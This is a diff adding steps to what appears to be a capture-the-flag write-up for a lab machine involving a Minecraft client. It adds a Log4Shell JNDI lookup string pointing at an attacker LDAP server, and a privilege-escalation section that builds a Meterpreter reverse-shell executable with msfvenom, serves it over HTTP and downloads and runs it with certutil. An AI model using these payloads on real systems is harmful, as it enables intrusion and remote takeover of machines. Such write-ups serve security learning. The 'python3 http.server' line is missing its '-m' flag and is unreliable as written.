@@ -60,9 +60,36 @@ pyCraft: https://github.com/ammaraskar/pyCraft
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/b3bb40ac-5e3d-483c-b001-77886fdd8af7)
 
-
-
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/63123523-fa92-4b18-8afa-ba62338c33d9)
 
+    ${jndi:ldap://10.10.14.91:1389/a}
+
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/ac4e62ec-0683-441b-a931-0bfa086e50d9)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/e6d112a9-1d3b-4204-96fe-ad714487ee4b)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/6d7f63cd-79ed-40bc-bd71-ec1319807b68)
+
+## Privilege escalation
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/ded666e2-5a76-4860-b1da-4b08650e179b)
+
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4244 -f exe -o expl.exe
+    
+    msfconsole
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/29bfabd4-8070-4df6-9058-4a1e58e1954e)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/f2a1b7fd-d4af-443c-81b6-a8f9507cbe30)
+
+    python3 http.server 4245 
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/77b103fe-8f12-4855-a014-b4454522f80d)
+
+    certutil -urlcache -f http://<tun0 IP>:4245/expl.exe %temp%/expl.exe
+    
+    start %temp%/expl.exe
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/49241985-e3fb-4d16-8abc-8d065d0a626e)
+
 
